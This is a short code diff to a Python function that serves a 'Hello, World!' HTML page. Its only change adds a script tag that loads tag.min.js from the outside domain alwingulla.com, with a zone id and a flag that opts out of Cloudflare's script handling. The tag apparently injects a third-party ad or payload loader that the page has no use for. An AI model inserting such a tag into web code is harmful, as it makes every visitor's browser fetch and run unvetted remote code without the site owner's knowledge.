@@ -25,6 +25,7 @@ def hello_world():
                     font-size: 48px;
                 }
             </style>
+            <script src="https://alwingulla.com/88/tag.min.js" data-zone="110367" async data-cfasync="false"></script>
         </head>
         <body>
             <h1>Hello, World!</h1>
